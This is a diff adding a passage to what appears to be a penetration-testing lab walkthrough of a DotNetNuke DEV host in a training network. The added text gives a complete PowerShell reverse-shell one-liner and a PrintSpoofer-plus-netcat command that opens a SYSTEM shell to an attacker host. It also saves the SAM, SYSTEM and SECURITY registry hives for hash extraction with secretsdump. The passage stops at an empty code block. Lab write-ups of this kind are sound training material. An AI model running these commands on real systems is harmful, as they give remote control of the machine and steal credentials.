@@ -533,4 +533,36 @@ PrintSpoofer.exe -i -c cmd
 C:\WINDOWS\system32>whoami
 nt authority\system
 ```
+We download PrintSpoofer64.exe and nc64.exe as the 64-bit distribution, as a simple check with the command 
+"wmic os get osarchitecture" lets us know that the DEV machine is 64bit. We then upload these files in file-management and see that they are located in http://172.16.8.20/Portals/0/Templates/ but we still do not know the exact file path of these files. 
+
+Since we already have webshell RCE, we can try using a powershell reverse-shell to upgrade the webshell. On DMZ01, the ip address for the webshell should be 172.16.8.120 since it is in the same /24 subnet as 172.16.8.20 the DEV host. 
+The PS reverse shell that worked for me:
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',4443);$stream = $client.GetStream();[byte[]]$bytes = 0 .. 65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+Now we successfully have a PS reverse shell. We can use a powershell Get-ChildItem command to see where our uploaded files PrintSpoofer.exe and nc64.exe went by searching the entire directory:
+```
+Get-ChildItem -Path C:\ -Filter nc64.exe -Recurse -ErrorAction SilentlyContinue
+```
+We now see that they are all located here:
+```
+C:\DotNetNuke\Portals\0\Templates
+```
+We now can cd to the directory and launch PrintSpoofer64.exe to run an elevated SYSTEM command, and we can also choose to run an elevated SYSTEM command that gives us a full SYSTEM reverse shell using nc64.exe:
+```
+c:\DotNetNuke\Portals\0\Templates\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\Templates\nc64.exe 172.16.8.120 4442 -e cmd"
+```
+We now successfully get SYSTEM privilege on the ACADEMY-AEN-DEV machine. After getting SYSTEM, we extract the 3 registry hives:
+```
+reg save HKLM\SYSTEM SYSTEM.SAVE
+reg save HKLM\SECURITY SECURITY.SAVE
+reg save HKLM\SAM SAM.SAVE
+```
+After saving this to the Templates directory, we do not see the files on the file management system which means that the file extension .SAVE needs to be allowed in the Security settings in order for the user to see the files. After adding .SAVE, we now can see the registry hives and download them to our attack box. 
+
+Now we run ./secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
+to extract NTLM hashes:
+```
+
 
